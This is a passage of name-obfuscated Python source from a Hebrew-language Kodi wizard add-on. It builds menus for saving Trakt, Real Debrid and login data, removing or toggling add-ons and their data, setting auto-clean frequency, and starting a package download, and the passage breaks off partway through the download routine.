	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0000O00OO0OO00O0 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O00OOO0000O0000O0 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3155
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0OO00O000OOOO000 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3156
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOO00O00OOO0000O0 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3159
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%OO00OOOOO0000OO0O .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3160
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0OOOO0OO00O0O0O0 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O00OO000O000O0O0O .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3163
	addFile ('%s שמירת פליליסט לאודר:  '%OO000000OOOO00000 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3164
	addFile ('%s שמירת הגדרות באפר: '%OOOO0OO000OOOOOO0 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3169
	addFile ('%s שמירת רשימות ריפו:  '%OOO0OOO00O00OOO00 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3171
	setView ('files','viewType')#line:3173
def traktMenu ():#line:3175
	OOOO00000O0O0OOOO ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3176
	O00O0OO0OO00O0OO0 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3177
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3178
	addFile ('Save Trakt Data: %s'%OOOO00000O0O0OOOO ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3179
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O00O0OO0OO00O0OO0 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3180
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3181
	for OOOO00000O0O0OOOO in traktit .ORDER :#line:3183
		OO0OO0OOO00O0OOO0 =TRAKTID [OOOO00000O0O0OOOO ]['name']#line:3184
		OOOO0O0OOOOOO0OO0 =TRAKTID [OOOO00000O0O0OOOO ]['path']#line:3185
		OO0OO0OO000000O0O =TRAKTID [OOOO00000O0O0OOOO ]['saved']#line:3186
		O0OO00OO0OO0OO00O =TRAKTID [OOOO00000O0O0OOOO ]['file']#line:3187
		O0O00OOOO0000OO0O =wiz .getS (OO0OO0OO000000O0O )#line:3188
		O0000OO000OOO0O0O =traktit .traktUser (OOOO00000O0O0OOOO )#line:3189
		O0000OOO0OO0OOOO0 =TRAKTID [OOOO00000O0O0OOOO ]['icon']if os .path .exists (OOOO0O0OOOOOO0OO0 )else ICONTRAKT #line:3190
		OOO0O00OOO0O00OOO =TRAKTID [OOOO00000O0O0OOOO ]['fanart']if os .path .exists (OOOO0O0OOOOOO0OO0 )else FANART #line:3191
		OOO0OO000O00O0OO0 =createMenu ('saveaddon','Trakt',OOOO00000O0O0OOOO )#line:3192
		OOO0O0O0OO0OO00OO =createMenu ('save','Trakt',OOOO00000O0O0OOOO )#line:3193
		OOO0OO000O00O0OO0 .append ((THEME2 %'%s Settings'%OO0OO0OOO00O0OOO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OOOO00000O0O0OOOO )))#line:3194
		addFile ('[+]-> %s'%OO0OO0OOO00O0OOO0 ,'',icon =O0000OOO0OO0OOOO0 ,fanart =OOO0O00OOO0O00OOO ,themeit =THEME3 )#line:3196
		if not os .path .exists (OOOO0O0OOOOOO0OO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0000OOO0OO0OOOO0 ,fanart =OOO0O00OOO0O00OOO ,menu =OOO0OO000O00O0OO0 )#line:3197
		elif not O0000OO000OOO0O0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OOOO00000O0O0OOOO ,icon =O0000OOO0OO0OOOO0 ,fanart =OOO0O00OOO0O00OOO ,menu =OOO0OO000O00O0OO0 )#line:3198
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0000OO000OOO0O0O ,'authtrakt',OOOO00000O0O0OOOO ,icon =O0000OOO0OO0OOOO0 ,fanart =OOO0O00OOO0O00OOO ,menu =OOO0OO000O00O0OO0 )#line:3199
		if O0O00OOOO0000OO0O =="":#line:3200
			if os .path .exists (O0OO00OO0OO0OO00O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OOOO00000O0O0OOOO ,icon =O0000OOO0OO0OOOO0 ,fanart =OOO0O00OOO0O00OOO ,menu =OOO0O0O0OO0OO00OO )#line:3201
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OOOO00000O0O0OOOO ,icon =O0000OOO0OO0OOOO0 ,fanart =OOO0O00OOO0O00OOO ,menu =OOO0O0O0OO0OO00OO )#line:3202
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00OOOO0000OO0O ,'',icon =O0000OOO0OO0OOOO0 ,fanart =OOO0O00OOO0O00OOO ,menu =OOO0O0O0OO0OO00OO )#line:3203
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3205
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3206
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3207
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3208
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3209
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3210
	setView ('files','viewType')#line:3211
def realMenu ():#line:3213
	OO0OO00OO0O0OOO0O ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3214
	O000O00O0OO00000O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3215
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3216
	addFile ('Save Real Debrid Data: %s'%OO0OO00OO0O0OOO0O ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3217
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O000O00O0OO00000O ),'',icon =ICONREAL ,themeit =THEME3 )#line:3218
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3219
	for OOO00OO0000O0OOO0 in debridit .ORDER :#line:3221
		OO0000O00OO0O000O =DEBRIDID [OOO00OO0000O0OOO0 ]['name']#line:3222
		OO00000OOO0O000O0 =DEBRIDID [OOO00OO0000O0OOO0 ]['path']#line:3223
		OO0O0OOO000O0O0O0 =DEBRIDID [OOO00OO0000O0OOO0 ]['saved']#line:3224
		OOO00OO0OO00OOOOO =DEBRIDID [OOO00OO0000O0OOO0 ]['file']#line:3225
		O0O0OO0O0O0O00000 =wiz .getS (OO0O0OOO000O0O0O0 )#line:3226
		O00O0O0OOOO000OO0 =debridit .debridUser (OOO00OO0000O0OOO0 )#line:3227
		O00OO00000OO0O0O0 =DEBRIDID [OOO00OO0000O0OOO0 ]['icon']if os .path .exists (OO00000OOO0O000O0 )else ICONREAL #line:3228
		OOO00OO000OOO0O00 =DEBRIDID [OOO00OO0000O0OOO0 ]['fanart']if os .path .exists (OO00000OOO0O000O0 )else FANART #line:3229
		O0OO0000OOO0OO0O0 =createMenu ('saveaddon','Debrid',OOO00OO0000O0OOO0 )#line:3230
		O0OOO00000000OO00 =createMenu ('save','Debrid',OOO00OO0000O0OOO0 )#line:3231
		O0OO0000OOO0OO0O0 .append ((THEME2 %'%s Settings'%OO0000O00OO0O000O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOO00OO0000O0OOO0 )))#line:3232
		addFile ('[+]-> %s'%OO0000O00OO0O000O ,'',icon =O00OO00000OO0O0O0 ,fanart =OOO00OO000OOO0O00 ,themeit =THEME3 )#line:3234
		if not os .path .exists (OO00000OOO0O000O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00OO00000OO0O0O0 ,fanart =OOO00OO000OOO0O00 ,menu =O0OO0000OOO0OO0O0 )#line:3235
		elif not O00O0O0OOOO000OO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOO00OO0000O0OOO0 ,icon =O00OO00000OO0O0O0 ,fanart =OOO00OO000OOO0O00 ,menu =O0OO0000OOO0OO0O0 )#line:3236
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O0O0OOOO000OO0 ,'authdebrid',OOO00OO0000O0OOO0 ,icon =O00OO00000OO0O0O0 ,fanart =OOO00OO000OOO0O00 ,menu =O0OO0000OOO0OO0O0 )#line:3237
		if O0O0OO0O0O0O00000 =="":#line:3238
			if os .path .exists (OOO00OO0OO00OOOOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOO00OO0000O0OOO0 ,icon =O00OO00000OO0O0O0 ,fanart =OOO00OO000OOO0O00 ,menu =O0OOO00000000OO00 )#line:3239
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOO00OO0000O0OOO0 ,icon =O00OO00000OO0O0O0 ,fanart =OOO00OO000OOO0O00 ,menu =O0OOO00000000OO00 )#line:3240
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0OO0O0O0O00000 ,'',icon =O00OO00000OO0O0O0 ,fanart =OOO00OO000OOO0O00 ,menu =O0OOO00000000OO00 )#line:3241
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3243
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3244
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3245
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3246
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3247
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3248
	setView ('files','viewType')#line:3249
def loginMenu ():#line:3251
	OO0O0O0OOOOO000OO ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3252
	O00OO00OO000000O0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3253
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3254
	addFile ('Save Login Data: %s'%OO0O0O0OOOOO000OO ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3255
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O00OO00OO000000O0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3256
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3257
	for OO0O0O0OOOOO000OO in loginit .ORDER :#line:3259
		OOOOO0000OO000OOO =LOGINID [OO0O0O0OOOOO000OO ]['name']#line:3260
		OO000O00OO0OOO0OO =LOGINID [OO0O0O0OOOOO000OO ]['path']#line:3261
		OOOOO0O0000OOOO00 =LOGINID [OO0O0O0OOOOO000OO ]['saved']#line:3262
		OOO0OO0OO0O0OOO0O =LOGINID [OO0O0O0OOOOO000OO ]['file']#line:3263
		OO00O0000O0OO0OO0 =wiz .getS (OOOOO0O0000OOOO00 )#line:3264
		OOOOO0O0OO0O0OO0O =loginit .loginUser (OO0O0O0OOOOO000OO )#line:3265
		O0OOOOO00O0O00O00 =LOGINID [OO0O0O0OOOOO000OO ]['icon']if os .path .exists (OO000O00OO0OOO0OO )else ICONLOGIN #line:3266
		O000O0OOOO0O0OOO0 =LOGINID [OO0O0O0OOOOO000OO ]['fanart']if os .path .exists (OO000O00OO0OOO0OO )else FANART #line:3267
		OOOO0OO0000O0O0OO =createMenu ('saveaddon','Login',OO0O0O0OOOOO000OO )#line:3268
		OOOO0O0OO0O00O0O0 =createMenu ('save','Login',OO0O0O0OOOOO000OO )#line:3269
		OOOO0OO0000O0O0OO .append ((THEME2 %'%s Settings'%OOOOO0000OO000OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO0O0O0OOOOO000OO )))#line:3270
		addFile ('[+]-> %s'%OOOOO0000OO000OOO ,'',icon =O0OOOOO00O0O00O00 ,fanart =O000O0OOOO0O0OOO0 ,themeit =THEME3 )#line:3272
		if not os .path .exists (OO000O00OO0OOO0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OOOOO00O0O00O00 ,fanart =O000O0OOOO0O0OOO0 ,menu =OOOO0OO0000O0O0OO )#line:3273
		elif not OOOOO0O0OO0O0OO0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO0O0O0OOOOO000OO ,icon =O0OOOOO00O0O00O00 ,fanart =O000O0OOOO0O0OOO0 ,menu =OOOO0OO0000O0O0OO )#line:3274
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOO0O0OO0O0OO0O ,'authlogin',OO0O0O0OOOOO000OO ,icon =O0OOOOO00O0O00O00 ,fanart =O000O0OOOO0O0OOO0 ,menu =OOOO0OO0000O0O0OO )#line:3275
		if OO00O0000O0OO0OO0 =="":#line:3276
			if os .path .exists (OOO0OO0OO0O0OOO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO0O0O0OOOOO000OO ,icon =O0OOOOO00O0O00O00 ,fanart =O000O0OOOO0O0OOO0 ,menu =OOOO0O0OO0O00O0O0 )#line:3277
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO0O0O0OOOOO000OO ,icon =O0OOOOO00O0O00O00 ,fanart =O000O0OOOO0O0OOO0 ,menu =OOOO0O0OO0O00O0O0 )#line:3278
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO00O0000O0OO0OO0 ,'',icon =O0OOOOO00O0O00O00 ,fanart =O000O0OOOO0O0OOO0 ,menu =OOOO0O0OO0O00O0O0 )#line:3279
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3281
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3282
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3283
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3284
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3285
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3286
	setView ('files','viewType')#line:3287
def fixUpdate ():#line:3289
	if KODIV <17 :#line:3290
		O0OOOO0OOO0O0O00O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3291
		try :#line:3292
			os .remove (O0OOOO0OOO0O0O00O )#line:3293
		except Exception as OOOO0O0OOOO00OO00 :#line:3294
			wiz .log ("Unable to remove %s, Purging DB"%O0OOOO0OOO0O0O00O )#line:3295
			wiz .purgeDb (O0OOOO0OOO0O0O00O )#line:3296
	else :#line:3297
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3298
def removeAddonMenu ():#line:3300
	O0O00O0OO00OO000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3301
	OOO0OO0OO00O00O0O =[];OOOO0000O0O00O0OO =[]#line:3302
	for OO000OOO000OOOO00 in sorted (O0O00O0OO00OO000O ,key =lambda O00OO000O0O0O0OOO :O00OO000O0O0O0OOO ):#line:3303
		O00OOO0OO0OOOOOOO =os .path .split (OO000OOO000OOOO00 [:-1 ])[1 ]#line:3304
		if O00OOO0OO0OOOOOOO in EXCLUDES :continue #line:3305
		elif O00OOO0OO0OOOOOOO in DEFAULTPLUGINS :continue #line:3306
		elif O00OOO0OO0OOOOOOO =='packages':continue #line:3307
		OOO00O0000O0O00OO =os .path .join (OO000OOO000OOOO00 ,'addon.xml')#line:3308
		if os .path .exists (OOO00O0000O0O00OO ):#line:3309
			OO00O0O0O0O0O0000 =open (OOO00O0000O0O00OO )#line:3310
			O0O0O00O0OO00OOOO =OO00O0O0O0O0O0000 .read ()#line:3311
			O000O0O00OO0OOO0O =wiz .parseDOM (O0O0O00O0OO00OOOO ,'addon',ret ='id')#line:3312
			O0O0O0O0OO0O0000O =O00OOO0OO0OOOOOOO if len (O000O0O00OO0OOO0O )==0 else O000O0O00OO0OOO0O [0 ]#line:3314
			try :#line:3315
				OO00O0O0O0O0OOOOO =xbmcaddon .Addon (id =O0O0O0O0OO0O0000O )#line:3316
				OOO0OO0OO00O00O0O .append (OO00O0O0O0O0OOOOO .getAddonInfo ('name'))#line:3317
				OOOO0000O0O00O0OO .append (O0O0O0O0OO0O0000O )#line:3318
			except :#line:3319
				pass #line:3320
	if len (OOO0OO0OO00O00O0O )==0 :#line:3321
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3322
		return #line:3323
	if KODIV >16 :#line:3324
		O0O0OO0OO00OO0000 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO0OO0OO00O00O0O )#line:3325
	else :#line:3326
		O0O0OO0OO00OO0000 =[];OO000O0000OOOO00O =0 #line:3327
		OO00O0OOOO0O0000O =["-- Click here to Continue --"]+OOO0OO0OO00O00O0O #line:3328
		while not OO000O0000OOOO00O ==-1 :#line:3329
			OO000O0000OOOO00O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO00O0OOOO0O0000O )#line:3330
			if OO000O0000OOOO00O ==-1 :break #line:3331
			elif OO000O0000OOOO00O ==0 :break #line:3332
			else :#line:3333
				O00OOO0000OO0O00O =(OO000O0000OOOO00O -1 )#line:3334
				if O00OOO0000OO0O00O in O0O0OO0OO00OO0000 :#line:3335
					O0O0OO0OO00OO0000 .remove (O00OOO0000OO0O00O )#line:3336
					OO00O0OOOO0O0000O [OO000O0000OOOO00O ]=OOO0OO0OO00O00O0O [O00OOO0000OO0O00O ]#line:3337
				else :#line:3338
					O0O0OO0OO00OO0000 .append (O00OOO0000OO0O00O )#line:3339
					OO00O0OOOO0O0000O [OO000O0000OOOO00O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOO0OO0OO00O00O0O [O00OOO0000OO0O00O ])#line:3340
	if O0O0OO0OO00OO0000 ==None :return #line:3341
	if len (O0O0OO0OO00OO0000 )>0 :#line:3342
		wiz .addonUpdates ('set')#line:3343
		for OO000O0O00O0OO000 in O0O0OO0OO00OO0000 :#line:3344
			removeAddon (OOOO0000O0O00O0OO [OO000O0O00O0OO000 ],OOO0OO0OO00O00O0O [OO000O0O00O0OO000 ],True )#line:3345
		xbmc .sleep (1000 )#line:3347
		if INSTALLMETHOD ==1 :OOOO0O00O0O000O00 =1 #line:3349
		elif INSTALLMETHOD ==2 :OOOO0O00O0O000O00 =0 #line:3350
		else :OOOO0O00O0O000O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3351
		if OOOO0O00O0O000O00 ==1 :wiz .reloadFix ('remove addon')#line:3352
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3353
def removeAddonDataMenu ():#line:3355
	if os .path .exists (ADDOND ):#line:3356
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3357
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3358
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3359
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3360
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3361
		O000000000O0O0000 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3362
		for OOOOO0O0O0OO0O0O0 in sorted (O000000000O0O0000 ,key =lambda OOOO0O0OO0O000OOO :OOOO0O0OO0O000OOO ):#line:3363
			OOO00O000O0OOO0OO =OOOOO0O0O0OO0O0O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3364
			OO0O0O00OO000OO0O =os .path .join (OOOOO0O0O0OO0O0O0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3365
			O000OOOO0OOOOO00O =os .path .join (OOOOO0O0O0OO0O0O0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3366
			O0OOOOOOO00000O0O =OOO00O000O0OOO0OO #line:3367
			OOOOO000OO00O000O ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3368
			for OO00OO00OOO0OOOOO in OOOOO000OO00O000O :#line:3369
				O0OOOOOOO00000O0O =O0OOOOOOO00000O0O .replace (OO00OO00OOO0OOOOO ,OOOOO000OO00O000O [OO00OO00OOO0OOOOO ])#line:3370
			if OOO00O000O0OOO0OO in EXCLUDES :O0OOOOOOO00000O0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0OOOOOOO00000O0O #line:3371
			else :O0OOOOOOO00000O0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0OOOOOOO00000O0O #line:3372
			addFile (' %s'%O0OOOOOOO00000O0O ,'removedata',OOO00O000O0OOO0OO ,icon =OO0O0O00OO000OO0O ,fanart =O000OOOO0OOOOO00O ,themeit =THEME2 )#line:3373
	else :#line:3374
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3375
	setView ('files','viewType')#line:3376
def enableAddons ():#line:3378
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3379
	O0OOO0OOO00O0OOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3380
	OO0OO0O0OO0OO0O00 =0 #line:3381
	for OO0O0OO0000O0OOO0 in sorted (O0OOO0OOO00O0OOOO ,key =lambda OOO000OOOO0OO0000 :OOO000OOOO0OO0000 ):#line:3382
		OO0OO0O0OO00O00O0 =os .path .split (OO0O0OO0000O0OOO0 [:-1 ])[1 ]#line:3383
		if OO0OO0O0OO00O00O0 in EXCLUDES :continue #line:3384
		if OO0OO0O0OO00O00O0 in DEFAULTPLUGINS :continue #line:3385
		OOO00OO000O0OO0OO =os .path .join (OO0O0OO0000O0OOO0 ,'addon.xml')#line:3386
		if os .path .exists (OOO00OO000O0OO0OO ):#line:3387
			OO0OO0O0OO0OO0O00 +=1 #line:3388
			O0OOO0OOO00O0OOOO =OO0O0OO0000O0OOO0 .replace (ADDONS ,'')[1 :-1 ]#line:3389
			O0OOO00OOOOOOO0O0 =open (OOO00OO000O0OO0OO )#line:3390
			O0O0O000OOOO0O0OO =O0OOO00OOOOOOO0O0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3391
			OOO0OOO000O0O000O =wiz .parseDOM (O0O0O000OOOO0O0OO ,'addon',ret ='id')#line:3392
			O000O0O0OOOOOOO0O =wiz .parseDOM (O0O0O000OOOO0O0OO ,'addon',ret ='name')#line:3393
			try :#line:3394
				O0O0O0OO0O0O0OO0O =OOO0OOO000O0O000O [0 ]#line:3395
				OO0O000O0O00OO00O =O000O0O0OOOOOOO0O [0 ]#line:3396
			except :#line:3397
				continue #line:3398
			try :#line:3399
				O0OO0OO0OO000OO00 =xbmcaddon .Addon (id =O0O0O0OO0O0O0OO0O )#line:3400
				O00000O0O0O000OOO ="[COLOR green][Enabled][/COLOR]"#line:3401
				O0OO0OO0O0O0OOO0O ="false"#line:3402
			except :#line:3403
				O00000O0O0O000OOO ="[COLOR red][Disabled][/COLOR]"#line:3404
				O0OO0OO0O0O0OOO0O ="true"#line:3405
				pass #line:3406
			O0O0O0OO00O00O0OO =os .path .join (OO0O0OO0000O0OOO0 ,'icon.png')if os .path .exists (os .path .join (OO0O0OO0000O0OOO0 ,'icon.png'))else ICON #line:3407
			O00OO0O0O0O000OO0 =os .path .join (OO0O0OO0000O0OOO0 ,'fanart.jpg')if os .path .exists (os .path .join (OO0O0OO0000O0OOO0 ,'fanart.jpg'))else FANART #line:3408
			addFile ("%s %s"%(O00000O0O0O000OOO ,OO0O000O0O00OO00O ),'toggleaddon',O0OOO0OOO00O0OOOO ,O0OO0OO0O0O0OOO0O ,icon =O0O0O0OO00O00O0OO ,fanart =O00OO0O0O0O000OO0 )#line:3409
			O0OOO00OOOOOOO0O0 .close ()#line:3410
	if OO0OO0O0OO0OO0O00 ==0 :#line:3411
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3412
	setView ('files','viewType')#line:3413
def changeFeq ():#line:3415
	OOOO00OO00OO0O0O0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3416
	OO0O0OOOO000000O0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOOO00OO00OO0O0O0 )#line:3417
	if not OO0O0OOOO000000O0 ==-1 :#line:3418
		wiz .setS ('autocleanfeq',str (OO0O0OOOO000000O0 ))#line:3419
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOOO00OO00OO0O0O0 [OO0O0OOOO000000O0 ]))#line:3420
def developer ():#line:3422
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3423
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3424
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3425
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3426
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3427
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3428
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3429
	setView ('files','viewType')#line:3431
def download (O0OO0OOOOO0000O0O ,OO0O0O00OOOO00000 ):#line:3436
  O0O00000O00OOOOOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3437
  OO00O000O0OOOO00O =xbmcgui .DialogProgress ()#line:3438
  OO00O000O0OOOO00O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3439
  O00000000OO000O0O =os .path .join (O0O00000O00OOOOOO ,'isr.zip')#line:3440
  O000OOOOO00OO0O0O =urllib2 .Request (O0OO0OOOOO0000O0O )#line:3441
  O00O00O0OO0OOOOO0 =urllib2 .urlopen (O000OOOOO00OO0O0O )#line:3442
  O0OOO0O00000O0O00 =xbmcgui .DialogProgress ()#line:3444
  O0OOO0O00000O0O00 .create ("Downloading","Downloading "+name )#line:3445
  O0OOO0O00000O0O00 .update (0 )#line:3446
